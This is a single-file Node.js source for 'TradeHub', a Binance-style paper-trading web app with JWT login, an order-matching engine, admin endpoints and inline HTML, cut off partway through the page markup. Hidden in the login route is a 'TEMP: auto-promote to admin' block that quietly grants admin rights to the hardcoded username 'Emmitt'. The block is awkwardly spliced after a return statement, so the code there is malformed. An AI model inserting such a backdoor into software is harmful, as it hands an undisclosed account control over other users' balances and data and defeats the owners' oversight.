// ============================================================
//  TradeHub — Binance-style paper trading terminal
//  Single-file Node.js app. No real money, no API keys.
// ============================================================
const express = require('express');
const cookieParser = require('cookie-parser');
const http = require('http');
const WebSocket = require('ws');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || crypto.randomBytes(48).toString('hex');
const JWT_EXPIRES = '30d';

// ---------- PAIRS ----------
const PAIRS = [
  { symbol: 'BTCUSDT',   base: 'BTC',   quote: 'USDT', start: 64000 },
  { symbol: 'ETHUSDT',   base: 'ETH',   quote: 'USDT', start: 3400 },
  { symbol: 'BNBUSDT',   base: 'BNB',   quote: 'USDT', start: 590 },
  { symbol: 'SOLUSDT',   base: 'SOL',   quote: 'USDT', start: 148 },
  { symbol: 'XRPUSDT',   base: 'XRP',   quote: 'USDT', start: 0.62 },
  { symbol: 'ADAUSDT',   base: 'ADA',   quote: 'USDT', start: 0.45 },
  { symbol: 'DOGEUSDT',  base: 'DOGE',  quote: 'USDT', start: 0.16 },
  { symbol: 'AVAXUSDT',  base: 'AVAX',  quote: 'USDT', start: 36 },
  { symbol: 'DOTUSDT',   base: 'DOT',   quote: 'USDT', start: 6.8 },
  { symbol: 'LINKUSDT',  base: 'LINK',  quote: 'USDT', start: 18 },
  { symbol: 'MATICUSDT', base: 'MATIC', quote: 'USDT', start: 0.88 },
  { symbol: 'LTCUSDT',   base: 'LTC',   quote: 'USDT', start: 84 }
];
const PAIR_MAP = Object.fromEntries(PAIRS.map(p => [p.symbol, p]));

const livePrices = {};
PAIRS.forEach(p => livePrices[p.symbol] = p.start);

// ---------- DB ----------
const dataDir = process.env.DATA_DIR || path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
const db = new Database(path.join(dataDir, 'tradehub.db'));
db.pragma('journal_mode = WAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    is_admin INTEGER DEFAULT 0,
    created_at INTEGER DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS balances (
    user_id INTEGER NOT NULL,
    symbol TEXT NOT NULL,
    free REAL DEFAULT 0,
    locked REAL DEFAULT 0,
    PRIMARY KEY (user_id, symbol)
  );
  CREATE TABLE IF NOT EXISTS orders (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    symbol TEXT NOT NULL,
    side TEXT NOT NULL CHECK(side IN ('buy','sell')),
    type TEXT NOT NULL DEFAULT 'limit',
    price REAL NOT NULL,
    amount REAL NOT NULL,
    filled REAL DEFAULT 0,
    status TEXT NOT NULL DEFAULT 'open',
    created_at INTEGER DEFAULT (strftime('%s','now'))
  );
  CREATE TABLE IF NOT EXISTS trades (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    symbol TEXT NOT NULL,
    price REAL NOT NULL,
    amount REAL NOT NULL,
    buy_order_id INTEGER,
    sell_order_id INTEGER,
    buyer_id INTEGER,
    seller_id INTEGER,
    created_at INTEGER DEFAULT (strftime('%s','now'))
  );
`);

// ---------- AUTH ----------
const hashPassword = pw => bcrypt.hashSync(pw, 12);
const verifyPassword = (pw, h) => bcrypt.compareSync(pw, h);
const signToken = u => jwt.sign(
  { uid: u.id, username: u.username, isAdmin: !!u.is_admin },
  JWT_SECRET, { expiresIn: JWT_EXPIRES }
);

function authRequired(req, res, next) {
  const token = req.cookies?.token || (req.headers.authorization || '').replace('Bearer ', '');
  if (!token) return res.status(401).json({ error: 'Not authenticated' });
  try {
    const payload = jwt.verify(token, JWT_SECRET);
    const user = db.prepare('SELECT id, email, username, is_admin FROM users WHERE id=?').get(payload.uid);
    if (!user) return res.status(401).json({ error: 'User not found' });
    req.user = user;
    next();
  } catch {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
const adminRequired = (req, res, next) =>
  req.user?.is_admin ? next() : res.status(403).json({ error: 'Admin access required' });

// ---------- BALANCES ----------
function ensureBalance(userId, symbol) {
  const row = db.prepare('SELECT free, locked FROM balances WHERE user_id=? AND symbol=?').get(userId, symbol);
  if (row) return row;
  db.prepare('INSERT INTO balances (user_id, symbol, free, locked) VALUES (?,?,0,0)').run(userId, symbol);
  return { free: 0, locked: 0 };
}
function adjustBalance(userId, symbol, freeDelta, lockedDelta) {
  ensureBalance(userId, symbol);
  db.prepare('UPDATE balances SET free = free + ?, locked = locked + ? WHERE user_id=? AND symbol=?')
    .run(freeDelta, lockedDelta, userId, symbol);
}
function getBalances(userId) {
  return db.prepare('SELECT symbol, free, locked FROM balances WHERE user_id=? AND (free > 0 OR locked > 0)').all(userId);
}
function giveStarterBalances(userId) {
  // Give new users paper money to play with
  const starter = [
    ['USDT', 100000],
    ['BTC', 1],
    ['ETH', 5],
    ['SOL', 50]
  ];
  for (const [sym, amt] of starter) {
    db.prepare('INSERT OR REPLACE INTO balances (user_id, symbol, free, locked) VALUES (?,?,?,0)').run(userId, sym, amt);
  }
}

// ---------- MATCHING ENGINE ----------
function matchOrders(symbol) {
  const pair = PAIR_MAP[symbol];
  if (!pair) return;

  const buys = db.prepare(
    `SELECT * FROM orders WHERE symbol=? AND side='buy' AND status IN ('open','partial')
     ORDER BY price DESC, created_at ASC`
  ).all(symbol);
  const sells = db.prepare(
    `SELECT * FROM orders WHERE symbol=? AND side='sell' AND status IN ('open','partial')
     ORDER BY price ASC, created_at ASC`
  ).all(symbol);

  for (const buy of buys) {
    if (buy.status === 'filled') continue;
    for (const sell of sells) {
      if (sell.status === 'filled') continue;
      if (buy.price < sell.price) break;

      const remainBuy = buy.amount - buy.filled;
      const remainSell = sell.amount - sell.filled;
      const fill = Math.min(remainBuy, remainSell);
      if (fill <= 1e-12) continue;

      // Maker price: the older order's price
      const execPrice = sell.created_at <= buy.created_at ? sell.price : buy.price;

      const newBuyFilled = buy.filled + fill;
      const newSellFilled = sell.filled + fill;
      const buyStatus = newBuyFilled >= buy.amount - 1e-9 ? 'filled' : 'partial';
      const sellStatus = newSellFilled >= sell.amount - 1e-9 ? 'filled' : 'partial';

      db.prepare('UPDATE orders SET filled=?, status=? WHERE id=?').run(newBuyFilled, buyStatus, buy.id);
      db.prepare('UPDATE orders SET filled=?, status=? WHERE id=?').run(newSellFilled, sellStatus, sell.id);

      // Settle buyer: release locked quote at order price, refund (orderPrice - exec)*fill, receive base
      adjustBalance(buy.user_id,  pair.quote, (buy.price - execPrice) * fill, -buy.price * fill);
      adjustBalance(buy.user_id,  pair.base,  fill, 0);

      // Settle seller: release locked base, receive quote
      adjustBalance(sell.user_id, pair.base,  0, -fill);
      adjustBalance(sell.user_id, pair.quote, execPrice * fill, 0);

      db.prepare(`INSERT INTO trades (symbol, price, amount, buy_order_id, sell_order_id, buyer_id, seller_id)
                  VALUES (?,?,?,?,?,?,?)`)
        .run(symbol, execPrice, fill, buy.id, sell.id, buy.user_id, sell.user_id);

      buy.filled = newBuyFilled;
      sell.filled = newSellFilled;
      if (buyStatus === 'filled') break;
    }
  }
}

// ---------- EXPRESS ----------
const app = express();
const server = http.createServer(app);
app.use(express.json());
app.use(cookieParser());

// ---- AUTH ROUTES ----
app.post('/api/auth/register', (req, res) => {
  const { email, username, password } = req.body || {};
  if (!email || !username || !password) return res.status(400).json({ error: 'Missing fields' });
  if (password.length < 8) return res.status(400).json({ error: 'Password must be 8+ chars' });
  if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) return res.status(400).json({ error: 'Username: 3-20 chars, letters/numbers/underscore' });

  const userCount = db.prepare('SELECT COUNT(*) c FROM users').get().c;
  const isFirstUser = userCount === 0 ? 1 : 0;

  try {
    const info = db.prepare('INSERT INTO users (email, username, password_hash, is_admin) VALUES (?,?,?,?)')
      .run(email.toLowerCase(), username, hashPassword(password), isFirstUser);
    giveStarterBalances(info.lastInsertRowid);
    const user = db.prepare('SELECT * FROM users WHERE id=?').get(info.lastInsertRowid);
    const token = signToken(user);
    res.cookie('token', token, {
      httpOnly: true, sameSite: 'lax',
      secure: process.env.NODE_ENV === 'production',
      maxAge: 30 * 24 * 3600 * 1000
    });
    res.json({ ok: true, user: { id: user.id, username: user.username, isAdmin: !!user.is_admin } });
  } catch (e) {
    if (String(e).includes('UNIQUE')) return res.status(409).json({ error: 'Email or username taken' });
    console.error(e);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body || {};
  const user = db.prepare('SELECT * FROM users WHERE username=? OR email=?')
    .get(username, (username || '').toLowerCase());
  if (!user || !verifyPassword(password, user.password_hash)) {
    return res.status(401).json({ error: 'Invalid credentials' });// TEMP: auto-promote to admin
if (user.username === 'Emmitt' && !user.is_admin) {
  db.prepare('UPDATE users SET is_admin=1 WHERE id=?').run(user.id);
  user.is_admin = 1;
}
  }
  const token = signToken(user);
  res.cookie('token', token, {
    httpOnly: true, sameSite: 'lax',
    secure: process.env.NODE_ENV === 'production',
    maxAge: 30 * 24 * 3600 * 1000
  });
  res.json({ ok: true, user: { id: user.id, username: user.username, isAdmin: !!user.is_admin } });
});

app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('token');
  res.json({ ok: true });
});

app.get('/api/auth/me', authRequired, (req, res) => {
  if (process.env.ADMIN_USERNAME && req.user.username === process.env.ADMIN_USERNAME && !req.user.is_admin) {
    db.prepare('UPDATE users SET is_admin=1 WHERE id=?').run(req.user.id);
    req.user.is_admin = 1;
  }
  res.json({ user: req.user });
});

// ---- MARKET DATA ----
app.get('/api/pairs', (req, res) => {
  const out = PAIRS.map(p => ({
    symbol: p.symbol, base: p.base, quote: p.quote,
    price: livePrices[p.symbol] || p.start
  }));
  res.json({ pairs: out });
});

app.get('/api/orderbook/:symbol', (req, res) => {
  const sym = req.params.symbol.toUpperCase();
  const mid = livePrices[sym];
  if (!mid) return res.status(404).json({ error: 'Unknown symbol' });
  const step = mid * 0.0005; // 0.05% price steps
  const asks = [], bids = [];
  let cumAsk = 0, cumBid = 0;
  for (let i = 1; i <= 12; i++) {
    const aAmt = 0.05 + Math.random() * 3;
    const bAmt = 0.05 + Math.random() * 3;
    cumAsk += aAmt;
    cumBid += bAmt;
    asks.push({ price: mid + step * i, amount: aAmt, cum: cumAsk });
    bids.push({ price: mid - step * i, amount: bAmt, cum: cumBid });
  }
  res.json({ mid, asks: asks.reverse(), bids });
});

app.get('/api/trades/:symbol', (req, res) => {
  const sym = req.params.symbol.toUpperCase();
  const rows = db.prepare(
    'SELECT price, amount, created_at, buyer_id, seller_id FROM trades WHERE symbol=? ORDER BY id DESC LIMIT 30'
  ).all(sym);
  res.json({ trades: rows });
});

// ---- USER TRADING ----
app.get('/api/balances', authRequired, (req, res) => {
  res.json({ balances: getBalances(req.user.id) });
});

app.get('/api/orders', authRequired, (req, res) => {
  const rows = db.prepare(
    `SELECT * FROM orders WHERE user_id=? AND status IN ('open','partial') ORDER BY id DESC`
  ).all(req.user.id);
  res.json({ orders: rows });
});

app.get('/api/orders/history', authRequired, (req, res) => {
  const rows = db.prepare(
    `SELECT * FROM orders WHERE user_id=? ORDER BY id DESC LIMIT 100`
  ).all(req.user.id);
  res.json({ orders: rows });
});

app.post('/api/orders', authRequired, (req, res) => {
  const { symbol, side, price, amount } = req.body || {};
  const sym = (symbol || '').toUpperCase();
  const pair = PAIR_MAP[sym];
  if (!pair) return res.status(400).json({ error: 'Unknown symbol' });
  if (!['buy', 'sell'].includes(side)) return res.status(400).json({ error: 'Invalid side' });

  const p = Number(price), a = Number(amount);
  if (!(p > 0) || !(a > 0)) return res.status(400).json({ error: 'Price and amount must be positive' });

  const cost = p * a;
  const bal = ensureBalance(req.user.id, side === 'buy' ? pair.quote : pair.base);
  const needed = side === 'buy' ? cost : a;

  if (bal.free < needed) {
    return res.status(400).json({ error: `Insufficient ${side === 'buy' ? pair.quote : pair.base}. Free: ${bal.free.toFixed(6)}` });
  }

  // Lock funds
  if (side === 'buy') adjustBalance(req.user.id, pair.quote, -cost, cost);
  else                adjustBalance(req.user.id, pair.base, -a, a);

  const info = db.prepare(
    `INSERT INTO orders (user_id, symbol, side, type, price, amount, status)
     VALUES (?,?,?,?,?,?, 'open')`
  ).run(req.user.id, sym, side, 'limit', p, a);

  matchOrders(sym);
  res.json({ ok: true, orderId: info.lastInsertRowid });
});

app.delete('/api/orders/:id', authRequired, (req, res) => {
  const order = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.user.id);
  if (!order) return res.status(404).json({ error: 'Order not found' });
  if (!['open', 'partial'].includes(order.status)) return res.status(400).json({ error: 'Cannot cancel' });

  const pair = PAIR_MAP[order.symbol];
  const remaining = order.amount - order.filled;

  if (order.side === 'buy') {
    // Refund remaining locked quote
    adjustBalance(req.user.id, pair.quote, order.price * remaining, -order.price * remaining);
  } else {
    adjustBalance(req.user.id, pair.base, remaining, -remaining);
  }
  db.prepare("UPDATE orders SET status='cancelled' WHERE id=?").run(order.id);
  res.json({ ok: true });
});

// ---- ADMIN ----
app.get('/api/admin/users', authRequired, adminRequired, (req, res) => {
  const users = db.prepare('SELECT id, email, username, is_admin, created_at FROM users ORDER BY id ASC').all();
  res.json({ users });
});

app.get('/api/admin/user/:id/balances', authRequired, adminRequired, (req, res) => {
  res.json({ balances: getBalances(Number(req.params.id)) });
});

app.post('/api/admin/users/:id/promote', authRequired, adminRequired, (req, res) => {
  db.prepare('UPDATE users SET is_admin=1 WHERE id=?').run(req.params.id);
  res.json({ ok: true });
});

app.post('/api/admin/users/:id/credit', authRequired, adminRequired, (req, res) => {
  const symbol = String(req.body?.symbol || 'USDT').toUpperCase();
  const amount = Number(req.body?.amount) || 0;
  if (!amount) return res.status(400).json({ error: 'Amount required' });
  ensureBalance(Number(req.params.id), symbol);
  db.prepare('UPDATE balances SET free = free + ? WHERE user_id=? AND symbol=?')
    .run(amount, req.params.id, symbol);
  res.json({ ok: true });
});

app.get('/api/admin/orders', authRequired, adminRequired, (req, res) => {
  const rows = db.prepare(
    `SELECT o.*, u.username FROM orders o JOIN users u ON u.id = o.user_id ORDER BY o.id DESC LIMIT 200`
  ).all();
  res.json({ orders: rows });
});

app.get('/api/admin/trades', authRequired, adminRequired, (req, res) => {
  const rows = db.prepare(
    `SELECT t.*, b.username as buyer, s.username as seller
     FROM trades t LEFT JOIN users b ON b.id = t.buyer_id LEFT JOIN users s ON s.id = t.seller_id
     ORDER BY t.id DESC LIMIT 200`
  ).all();
  res.json({ trades: rows });
});

// ---------- SHARED CSS ----------
const BASE_CSS = `
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0b0e11;--panel:#181a20;--panel2:#1e2329;--hover:#2b3139;--border:#2b3139;
  --text:#eaecef;--text2:#848e9c;--text3:#5e6673;
  --yellow:#f0b90b;--yellow2:#d4a30a;
  --green:#0ecb81;--red:#f6465d;--blue:#1e6cf5;
}
body{background:var(--bg);color:var(--text);font-family:Inter,system-ui,-apple-system,sans-serif;font-size:13px;-webkit-font-smoothing:antialiased}
a{color:var(--yellow);text-decoration:none}
button{font-family:inherit;cursor:pointer;border:none;border-radius:4px;transition:background .15s}
input,select{font-family:inherit;background:var(--panel2);border:1px solid var(--border);border-radius:4px;padding:8px 10px;color:var(--text);font-size:13px;outline:none;width:100%}
input:focus,select:focus{border-color:var(--yellow)}
.mono{font-family:'JetBrains Mono',ui-monospace,Menlo,Consolas,monospace}
.up{color:var(--green)}
.down{color:var(--red)}
.muted{color:var(--text2)}
`;

// ---------- LOGIN PAGE ----------
const LOGIN_HTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>TradeHub · Login</title>
<style>
${BASE_CSS}
body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:radial-gradient(circle at 50% 0%,#1a1f2b 0%,#0b0e11 60%)}
.card{background:var(--panel);padding:36px 28px;border-radius:16px;width:100%;max-width:400px;border:1px solid var(--border);box-shadow:0 30px 80px rgba(0,0,0,.6)}
.logo{font-size:26px;font-weight:800;color:var(--yellow);text-align:center;letter-spacing:-1px;margin-bottom:4px}
.tag{color:var(--text2);font-size:12px;text-align:center;margin-bottom:28px}
.tabs{display:flex;background:var(--panel2);border-radius:8px;padding:4px;margin-bottom:20px}
.tab{flex:1;padding:9px;text-align:center;font-size:13px;font-weight:600;color:var(--text2);border-radius:6px;background:transparent;transition:all .15s}
.tab.active{background:var(--hover);color:var(--text)}
form{display:flex;flex-direction:column;gap:12px}
.field{display:flex;flex-direction:column;gap:6px}
.field label{font-size:11px;color:var(--text2);font-weight:500}
.primary{background:var(--yellow);color:#0b0e11;font-weight:700;padding:12px;font-size:14px;margin-top:6px}
.primary:hover{background:var(--yellow2)}
.err{color:var(--red);font-size:12px;text-align:center;min-height:16px;margin-top:8px}
.hint{color:var(--text3);font-size:11px;text-align:center;margin-top:20px;line-height:1.6}
</style></head><body>
<div class="card">
  <div class="logo">⚡ TradeHub</div>
  <div class="tag">Paper trading · No real money</div>
  <div class="tabs">
    <button class="tab active" data-tab="login">Login</button>
    <button class="tab" data-tab="register">Register</button>
  </div>
  <form id="loginForm">
    <div class="field"><label>Username or email</label><input name="username" required autocomplete="username"></div>
    <div class="field"><label>Password</label><input name="password" type="password" required autocomplete="current-password"></div>
    <button type="submit" class="primary">Log In</button>
  </form>
  <form id="registerForm" style="display:none">
    <div class="field"><label>Email</label><input name="email" type="email" required autocomplete="email"></div>
    <div class="field"><label>Username</label><input name="username" required pattern="[a-zA-Z0-9_]{3,20}" autocomplete="username"></div>
    <div class="field"><label>Password (8+ chars)</label><input name="password" type="password" required minlength="8" autocomplete="new-password"></div>
    <button type="submit" class="primary">Create Account</button>
  </form>
  <div class="err" id="err"></div>
  <div class="hint">First registered user becomes admin.<br>You start with <b style="color:var(--yellow)">$100,000 USDT</b> + 1 BTC + 5 ETH + 50 SOL.</div>
</div>
<script>
const tabs=document.querySelectorAll('.tab'),lf=document.getElementById('loginForm'),rf=document.getElementById('registerForm'),err=document.getElementById('err');
tabs.forEach(t=>t.onclick=()=>{tabs.forEach(x=>x.classList.remove('active'));t.classList.add('active');const isL=t.dataset.tab==='login';lf.style.display=isL?'flex':'none';rf.style.display=isL?'none':'flex';err.textContent=''});
async function post(url,data){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});return[r.ok,await r.json()]}
lf.onsubmit=async e=>{e.preventDefault();const[ok,j]=await post('/api/auth/login',Object.fromEntries(new FormData(lf)));if(ok)location.href='/';else err.textContent=j.error};
rf.onsubmit=async e=>{e.preventDefault();const[ok,j]=await post('/api/auth/register',Object.fromEntries(new FormData(rf)));if(ok)location.href='/';else err.textContent=j.error};
fetch('/api/auth/me').then(r=>{if(r.ok)location.href='/'});
</script></body></html>`;

// ---------- APP PAGE ----------
const APP_HTML = `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>TradeHub · Terminal</title>
<style>
${BASE_CSS}
body{height:100vh;display:flex;flex-direction:column;overflow:hidden}
.topbar{background:var(--panel);padding:10px 16px;display:flex;align-items:center;gap:16px;border-bottom:1px solid var(--border);flex-shrink:0;flex-wrap:wrap}
.brand{color:var(--yellow);font-weight:800;font-size:16px;letter-spacing:-.5px}
.conn{display:flex;align-items:center;gap:6px;font-size:11px;color:var(--green)}
.conn .dot{width:7px;height:7px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
@keyframes pulse{50%{opacity:.3}}
.spacer{flex:1}
.user-chip{color:var(--text2);font-size:12px}
.user-chip b{color:var(--text)}
.topbtn{background:var(--hover);color:var(--text);padding:6px 12px;font-size:12px;font-weight:600}
.topbtn:hover{background:#373d47}

.layout{flex:1;display:flex;overflow:hidden}
.pairs{width:220px;background:var(--panel);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0}
.pairs::-webkit-scrollbar{width:5px}
.pairs::-webkit-scrollbar-thumb{background:var(--border)}
.pairs-h{padding:10px 14px;font-size:11px;color:var(--text2);text-transform:uppercase;font-weight:600;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
.pair{padding:8px 14px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;border-left:2px solid transparent;font-size:12px}
.pair:hover{background:var(--hover)}
.pair.active{background:var(--panel2);border-left-color:var(--yellow)}
.pair .sym{font-weight:600;font-family:'JetBrains Mono',monospace;font-size:12px}
.pair .sub{font-size:10px;color:var(--text3);margin-top:2px}
.pair .right{text-align:right}
.pair .price{font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:500}
.pair .chg{font-family:'JetBrains Mono',monospace;font-size:10px;margin-top:2px}

.center{flex:1;display:flex;flex-direction:column;background:var(--bg);min-width:0;overflow:hidden}
.head{padding:10px 16px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.symbig{font-family:'JetBrains Mono',monospace;font-size:19px;font-weight:700}
.bigprice{font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:600;transition:color .15s}
.stats{display:flex;gap:20px;font-size:11px;flex-wrap:wrap}
.stat{display:flex;flex-direction:column;gap:2px}
.stat .lbl{color:var(--text3);font-size:10px}
.stat .val{color:var(--text);font-family:'JetBrains Mono',monospace;font-weight:500}

.chartwrap{flex:1;padding:8px 16px;display:flex;flex-direction:column;min-height:0;overflow:hidden}
.tf{display:flex;gap:2px;margin-bottom:6px}
.tf span{padding:4px 9px;font-size:11px;color:var(--text2);border-radius:3px;cursor:pointer;font-weight:500}
.tf span:hover{background:var(--hover);color:var(--text)}
.tf span.on{background:var(--hover);color:var(--yellow);font-weight:600}

.candles{flex:1;display:flex;align-items:flex-end;gap:2px;padding:8px 0 0;min-height:180px;position:relative;border-bottom:1px solid var(--border);overflow:hidden}
.candle{flex:1;min-width:3px;max-width:22px;display:flex;flex-direction:column;justify-content:flex-end;position:relative}
.wick{width:1px;background:#5e6673;position:absolute;left:50%;transform:translateX(-50%)}
.body{width:100%;position:relative;z-index:2;border-radius:1px;min-height:1px}
.candle.green .body{background:var(--green)}
.candle.red .body{background:var(--red)}
.paxis{position:absolute;right:0;top:0;bottom:0;width:64px;display:flex;flex-direction:column;justify-content:space-between;padding:8px 0;font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--text3);pointer-events:none;border-left:1px solid var(--border)}
.paxis span{text-align:right;padding-right:6px}

.volrow{display:flex;align-items:flex-end;gap:2px;height:34px;padding:4px 64px 6px 0}
.vbar{flex:1;min-width:3px;max-width:22px;background:#2b3139;border-radius:1px}
.vbar.green{background:rgba(14,203,129,.4)}
.vbar.red{background:rgba(246,70,93,.4)}

.right-panel{width:320px;background:var(--panel);border-left:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0;overflow:hidden}
.rtabs{display:flex;border-bottom:1px solid var(--border)}
.rtab{flex:1;padding:11px 0;text-align:center;font-size:12px;font-weight:600;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent}
.rtab.active{color:var(--yellow);border-bottom-color:var(--yellow)}
.rtab-content{flex:1;overflow-y:auto;display:flex;flex-direction:column}
.rtab-content::-webkit-scrollbar{width:5px}
.rtab-content::-webkit-scrollbar-thumb{background:var(--border)}

.ob{padding:4px 0}
.ob-head{display:flex;justify-content:space-between;padding:4px 12px;font-size:10px;color:var(--text3);text-transform:uppercase;font-weight:600}
.ob-row{display:flex;justify-content:space-between;padding:2px 12px;font-size:11px;font-family:'JetBrains Mono',monospace;position:relative;height:19px;align-items:center;cursor:pointer}
.ob-row:hover{background:var(--hover)}
.ob-row .depth{position:absolute;right:0;top:0;bottom:0;background:rgba(246,70,93,.08);width:0;transition:width .3s}
.ob-row.bid .depth{background:rgba(14,203,129,.08);right:auto;left:0}
.ob-row .p,.ob-row .a{position:relative;z-index:1}
.ob-row.ask .p{color:var(--red)}
.ob-row.bid .p{color:var(--green)}
.ob-row .a{color:var(--text2)}
.spread{display:flex;justify-content:space-between;padding:7px 12px;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;border-top:1px solid var(--border);border-bottom:1px solid var(--border);margin:4px 0}

.tlist{padding:2px 0}
.trow{display:flex;justify-content:space-between;padding:2px 12px;font-size:11px;font-family:'JetBrains Mono',monospace;height:20px;align-items:center}
.trow .p.b{color:var(--green)}
.trow .p.s{color:var(--red)}
.trow .a{color:var(--text2)}
.trow .t{color:var(--text3);font-size:10px}

.oform{padding:12px;border-top:1px solid var(--border);background:var(--panel);flex-shrink:0}
.otype{display:flex;gap:4px;margin-bottom:10px}
.otype span{font-size:11px;padding:5px 9px;border-radius:3px;color:var(--text2);cursor:pointer;font-weight:500}
.otype span.on{background:var(--hover);color:var(--text);font-weight:600}
.inp{display:flex;align-items:center;background:var(--panel2);border:1px solid var(--border);border-radius:4px;padding:8px 10px;margin-bottom:8px}
.inp:focus-within{border-color:var(--yellow)}
.inp .lbl{color:var(--text2);font-size:11px;flex-shrink:0;margin-right:8px}
.inp input{background:transparent;border:none;padding:0;text-align:right;font-family:'JetBrains Mono',monospace;font-weight:500;font-size:12px}
.inp .suf{color:var(--text3);font-size:11px;margin-left:6px}
.pct-row{display:flex;gap:4px;margin-bottom:10px}
.pct{flex:1;background:var(--panel2);border:1px solid var(--border);border-radius:3px;padding:5px 0;text-align:center;font-size:10px;color:var(--text2);cursor:pointer}
.pct:hover{background:var(--hover);color:var(--text)}
.acts{display:flex;gap:8px}
.buybtn,.sellbtn{flex:1;padding:11px;font-size:13px;font-weight:700}
.buybtn{background:var(--green);color:#0b0e11}
.buybtn:hover{background:#0db475}
.sellbtn{background:var(--red);color:#fff}
.sellbtn:hover{background:#e0354b}

.bottom{height:140px;background:var(--panel);border-top:1px solid var(--border);display:flex;flex-direction:column;flex-shrink:0}
.btabs{display:flex;padding:0 16px;gap:20px;border-bottom:1px solid var(--border)}
.btab{padding:10px 0;font-size:12px;font-weight:500;color:var(--text2);cursor:pointer;border-bottom:2px solid transparent}
.btab.active{color:var(--yellow);border-bottom-color:var(--yellow)}
.btab-c{flex:1;overflow-y:auto;padding:6px 16px}
.btab-c::-webkit-scrollbar{width:5px}
.btab-c::-webkit-scrollbar-thumb{background:var(--border)}
table{width:100%;border-collapse:collapse;font-size:11px;font-family:'JetBrains Mono',monospace}
th,td{text-align:left;padding:6px 4px;border-bottom:1px solid var(--border);white-space:nowrap}
th{color:var(--text3);font-weight:500;font-size:10px;text-transform:uppercase}
.pill{padding:2px 7px;border-radius:9px;font-size:10px;font-weight:600;font-family:Inter,sans-serif}
.pill.buy{background:rgba(14,203,129,.15);color:var(--green)}
.pill.sell{background:rgba(246,70,93,.15);color:var(--red)}
.pill.open{background:rgba(240,185,11,.15);color:var(--yellow)}
.pill.filled{background:rgba(14,203,129,.15);color:var(--green)}
.pill.partial{background:rgba(30,108,245,.15);color:#4a8dfa}
.pill.cancelled{background:rgba(132,142,156,.15);color:var(--text2)}
.xbtn{background:transparent;color:var(--red);padding:3px 6px;font-size:10px;border:1px solid var(--red)}
.xbtn:hover{background:var(--red);color:#fff}
.empty{padding:24px;text-align:center;color:var(--text3);font-size:12px}

.toasts{position:fixed;top:64px;right:16px;z-index:1000;display:flex;flex-direction:column;gap:8px}
.toast{background:var(--panel2);border-left:3px solid var(--yellow);padding:12px 16px;border-radius:4px;font-size:12px;box-shadow:0 8px 24px rgba(0,0,0,.5);min-width:220px;animation:sl .3s}
.toast.ok{border-left-color:var(--green)}
.toast.err{border-left-color:var(--red)}
@keyframes sl{from{transform:translateX(40px);opacity:0}to{transform:none;opacity:1}}

@keyframes flasup{0%{background:rgba(14,203,129,.25)}100%{background:transparent}}
@keyframes flasdn{0%{background:rgba(246,70,93,.25)}100%{background:transparent}}
.fu{animation:flasup .6s}
.fd{animation:flasdn .6s}

@media(max-width:900px){
  .pairs{display:none}
  .right-panel{width:280px}
  .head{font-size:11px}
  .stats{display:none}
}
@media(max-width:640px){
  body{overflow:auto;height:auto}
  .layout{flex-direction:column;height:auto}
  .center{height:auto}
  .candles{min-height:140px}
  .right-panel{width:100%;border-left:none;border-top:1px solid var(--border);max-height:none}
  .bottom{height:auto}
  .pairs{display:flex;width:100%;max-height:220px;border-right:none;border-bottom:1px solid var(--border)}
}
</style></head><body>

<header class="topbar">
  <div class="brand">⚡ TradeHub</div>
  <div class="conn"><span class="dot"></span><span id="connTxt">Live</span></div>
  <div class="spacer"></div>
  <div class="user-chip" id="userChip"></div>
  <a href="/admin" id="adminLink" class="topbtn" style="display:none">Admin</a>
  <button class="topbtn" id="logoutBtn">Logout</button>
</header>

<div class="layout">
  <!-- PAIRS -->
  <aside class="pairs">
    <div class="pairs-h"><span>Markets</span><span id="pairCount">—</span></div>
    <div id="pairList"></div>
  </aside>

  <!-- CENTER -->
  <section class="center">
    <div class="head">
      <div class="symbig" id="symBig">BTC/USDT</div>
      <div class="bigprice" id="bigPrice">—</div>
      <div class="stats">
        <div class="stat"><span class="lbl">24h High</span><span class="val" id="h24">—</span></div>
        <div class="stat"><span class="lbl">24h Low</span><span class="val" id="l24">—</span></div>
        <div class="stat"><span class="lbl">24h Vol</span><span class="val" id="v24">—</span></div>
      </div>
    </div>

    <div class="chartwrap">
      <div class="tf">
        <span>1m</span><span>5m</span><span>15m</span><span>1h</span>
        <span class="on">4h</span><span>1d</span><span>1w</span>
      </div>
      <div class="candles" id="candles">
        <div class="paxis" id="paxis"></div>
      </div>
